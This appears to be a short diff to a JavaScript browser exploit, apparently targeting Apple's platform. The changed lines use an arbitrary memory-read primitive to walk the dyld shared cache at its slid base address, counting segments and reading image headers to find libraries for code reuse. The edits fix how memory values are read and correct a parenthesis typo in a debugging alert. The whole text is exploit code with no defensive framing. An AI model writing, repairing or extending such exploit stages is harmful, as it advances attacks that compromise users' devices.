@@ -551,10 +551,10 @@ function exploit(){
         var hdr = Add(0x180000000,slide);
         var base_seg = null;
         //var dcache_nsegs = memory.read_i32(base + 0x14);
-        var nsegs = memory.u32(Add(hdr,0x14));
+        var nsegs = memory.read_i32(Add(hdr,0x14));
         //alert("nsegs + 4000 bytes" + memory.u32(Add(hdr,0x4014)))
         log('[+] The dyld shared cache seems to have '+nsegs+' segments.');
-        var segdata  = memory.read(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
+        var segdata  = memory.read(Add(hdr, memory.read_i32(Add(hdr, 0x10))), nsegs * 0x20);
         var segs     = [];
         for(var i = 0; i < nsegs; ++i)
         {
@@ -659,7 +659,7 @@ function exploit(){
             };
             var base = Add(memory.u32(Add(imgs, i * 0x20)), cache_slide);
             alert(base)
-            alert(Add(r32(Add(imgs, i * 0x20),cache_slide))))
+            alert(Add(r32(Add(imgs, i * 0x20),cache_slide)))
             if(opcode_libs.some(lib => strcmp(fn, lib)))
             {
                 var ncmds = memory.u32(Add(base, 0x10));
